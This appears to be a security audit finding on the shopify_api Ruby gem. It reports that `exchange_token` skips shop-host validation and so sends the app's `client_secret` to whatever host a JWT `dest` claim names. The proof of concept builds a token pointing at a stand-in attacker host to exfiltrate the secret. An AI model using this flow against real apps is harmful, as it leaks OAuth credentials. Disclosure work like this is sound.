### Title
`TokenExchange.exchange_token()` sends the app's `client_secret` to an unvalidated host derived from the JWT `dest` claim - ([File: lib/shopify_api/auth/token_exchange.rb])

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` builds the OAuth token-exchange request host directly from the session token's `dest` claim without passing it through `Utils::ShopValidator`, unlike every other code path in the gem that sends `client_secret` to a shop-supplied host.

### Finding Description
`exchange_token` decodes the caller-supplied session token and takes the shop straight from the claim: [1](#0-0) 

`JwtPayload#shop` performs no format/allow-list validation — it only strips a literal `"https://"` prefix from the raw `dest` claim value: [2](#0-1) 

That unsanitized value is used to build a `Session`, which `Clients::HttpClient` turns directly into the request host, and the request body carries the app's `client_secret`: [3](#0-2) [4](#0-3) 

Compare this to the three sibling code paths in the same module/area that also send `client_secret` to a shop-derived host: `TokenExchange.migrate_to_expiring_token`, `ClientCredentials.client_credentials`, and `RefreshToken.refresh_access_token` — every one of them explicitly calls `Utils::ShopValidator.sanitize!(shop)` before constructing the session/host used for the credentialed request: [5](#0-4) [6](#0-5) [7](#0-6) 

`ShopValidator.sanitize!` restricts the resulting host to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`), which is exactly the defense-in-depth control the maintainers consider necessary whenever a shop identifier is about to receive the app's `client_secret`: [8](#0-7) 

`exchange_token` is the one exception: it trusts the JWT `dest` claim as if it were already a validated Shopify host, breaking the equality the rest of the gem enforces: `host that receives client_secret == ShopValidator-sanitized(shop)`. Here it instead becomes `host that receives client_secret == raw JWT dest claim`.

### Impact Explanation
If the `dest` claim of a validly-signed session token ever contains anything other than a genuine `*.myshopify.com`/trusted admin domain (e.g., a token whose `iss`/`dest` come from a non-admin context — the codebase itself tests "checkout UI extension" tokens with different `iss` shapes and no `sid`, showing `dest` is not uniformly constrained to admin-store hosts), `exchange_token` will construct an HTTPS request to that host and place the app's `client_id`/`client_secret` in the POST body. This is SSRF carrying the app's OAuth client credentials — High severity per the impact criteria, matching "SSRF with the app's credentials" and "credential leakage" categories.

### Likelihood Explanation
`JWT.decode` is called with `algorithm: "HS256"` explicitly, so an attacker without `api_secret_key` cannot forge the signature outright, which limits likelihood. However, the missing `ShopValidator.sanitize!` call means `exchange_token` provides zero defense-in-depth against any legitimately-signed token whose `dest` is not a real, trusted Shopify domain — a gap the maintainers evidently recognized and closed for `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token`, but not for `exchange_token`, the most commonly used flow (recommended by the gem's own docs for embedded apps). This is a reachable, unprivileged-input code path: any caller/embedded-app surface that forwards a session token into `exchange_token` triggers it.

### Recommendation
In `lib/shopify_api/auth/token_exchange.rb`, validate `dest_shop` with `Utils::ShopValidator.sanitize!(dest_shop)` (mirroring `migrate_to_expiring_token`) before constructing `shop_session`/`HttpClient`, so the JWT `dest` claim is bound to the same trusted-domain allow-list enforced everywhere else the `client_secret` is transmitted.

### Proof of Concept
1. Obtain (or, in a test harness, construct with the app's own secret to demonstrate the missing check) a session token whose `dest` claim is `"https://attacker-controlled-host.example"` but which still passes `aud == Context.api_key` and signature verification.
2. Call:
```ruby
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: crafted_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
```
3. Observe that `Clients::HttpClient` sends an HTTPS POST to `https://attacker-controlled-host.example/admin/oauth/access_token` with `client_id` and `client_secret` in the body — no `ShopValidator` check rejects the host, unlike the equivalent call in `migrate_to_expiring_token`, `client_credentials`, or `refresh_access_token`, which would raise `Errors::InvalidShopError` for the same host value.
